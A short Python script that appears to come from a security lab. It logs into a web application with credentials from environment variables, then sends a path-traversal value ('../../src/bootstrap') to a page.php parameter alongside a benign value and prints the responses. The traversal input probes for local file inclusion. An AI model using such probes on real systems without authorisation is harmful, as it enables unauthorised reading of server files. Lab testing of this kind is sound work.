import os, urllib.request, urllib.parse
base=os.environ['LAB30_URL'].rstrip('/')
try:
    urllib.request.urlopen(urllib.request.Request(base+'/auth/login.php', data=urllib.parse.urlencode({'username':os.environ['LAB30_USER'],'password':os.environ['LAB30_PASSWORD']}).encode(), method='POST'), timeout=10)
except Exception as e:
    print('login attempt', e)
for q in ['home','../../src/bootstrap']:
    u=base+'/content/page.php?'+urllib.parse.urlencode({'page':q})
    try:
        r=urllib.request.urlopen(u, timeout=10); body=r.read().decode('utf-8','replace')
        print('INPUT',q,'STATUS',r.status,'LEN',len(body))
        print(body[:300])
    except Exception as e:
        print('INPUT',q,'ERR',e)

